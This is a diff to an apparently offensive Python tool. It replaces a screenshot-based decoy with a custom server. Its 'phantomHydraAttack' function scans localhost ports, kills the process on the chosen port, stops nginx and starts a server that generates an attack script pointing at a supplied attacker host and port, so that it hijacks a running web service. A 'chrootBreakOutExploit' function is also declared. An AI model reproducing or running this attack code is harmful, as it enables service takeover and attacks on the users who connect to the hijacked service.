@@ -21,38 +21,39 @@ import sys
 # install_if_missing("flask")
 # install_if_missing("webdriver_manager")
 # install_if_missing("psutil")
-from server import ImageServer
-from io import BytesIO
-from PIL import Image
-from webdriver_manager.chrome import ChromeDriverManager
-from selenium.webdriver.chrome.service import Service
-from selenium import webdriver
+# from server import ImageServer
+# from io import BytesIO
+# from PIL import Image
+# from webdriver_manager.chrome import ChromeDriverManager
+# from selenium.webdriver.chrome.service import Service
+# from selenium import webdriver
 import socket
-import os
+# import os
 from process_manager import ProcessManager
+from custom_server import CustomServer 
 
-def _capture_host_screenshot(host="localhost", port=3000):
-    # Setup Selenium WebDriver
-    options = webdriver.ChromeOptions()
-    options.add_argument("--headless")  # Run in headless mode (no GUI)
-    options.add_argument("--no-sandbox")
-    options.add_argument("--disable-dev-shm-usage")
+# def _capture_host_screenshot(host="localhost", port=3000):
+#     # Setup Selenium WebDriver
+#     options = webdriver.ChromeOptions()
+#     options.add_argument("--headless")  # Run in headless mode (no GUI)
+#     options.add_argument("--no-sandbox")
+#     options.add_argument("--disable-dev-shm-usage")
 
-    driver = webdriver.Chrome(service=Service(
-        ChromeDriverManager().install()), options=options)
-    driver.get("http://{}:{}".format(host, port))
+#     driver = webdriver.Chrome(service=Service(
+#         ChromeDriverManager().install()), options=options)
+#     driver.get("http://{}:{}".format(host, port))
 
-    # Capture screenshot as binary data
-    screenshot = driver.get_screenshot_as_png()
+#     # Capture screenshot as binary data
+#     screenshot = driver.get_screenshot_as_png()
 
-    # Convert to PIL Image
-    img = Image.open(BytesIO(screenshot))
-    save_path = os.path.join(os.getcwd(), f"assets/screenshot_{port}.png")
-    img.save(save_path)
+#     # Convert to PIL Image
+#     img = Image.open(BytesIO(screenshot))
+#     save_path = os.path.join(os.getcwd(), f"assets/screenshot_{port}.png")
+#     img.save(save_path)
 
-    driver.quit()
+#     driver.quit()
 
-    return save_path  # Returns a PIL Image object
+#     return save_path  # Returns a PIL Image object
 
 
 def _scan_localhost_ports(start_port=1, end_port=65535):
@@ -72,15 +73,18 @@ def _scan_localhost_ports(start_port=1, end_port=65535):
 def phantomHydraAttack(port_start, port_end, attack_host, attack_port):
     _scan_localhost_ports(port_start, port_end)
     port = int(input("Enter Open Port on which you want to continue: "))
-    screenshotPath = _capture_host_screenshot(port=port)
-    imageServer = ImageServer(
-        port=port, image_path=screenshotPath, host="localhost")
-    imageServer._generate_script(attack_host, attack_port)
+    custom_server = CustomServer(port=port)
+    # screenshotPath = _capture_host_screenshot(port=port)
+    # imageServer = ImageServer(
+    #     port=port, image_path=screenshotPath, host="localhost")
+    # imageServer._generate_script(attack_host, attack_port)
+    custom_server.generate_script_for_attack(host=attack_host,port=attack_port)
     processManager = ProcessManager(port=port)
     processManager.kill_process_on_port()
     if (processManager.is_nginx_running()):
         processManager.stop_nginx()
-        imageServer.run_server()
+        custom_server.start_server()
+        # imageServer.run_server()
 
 
 def chrootBreakOutExploit():
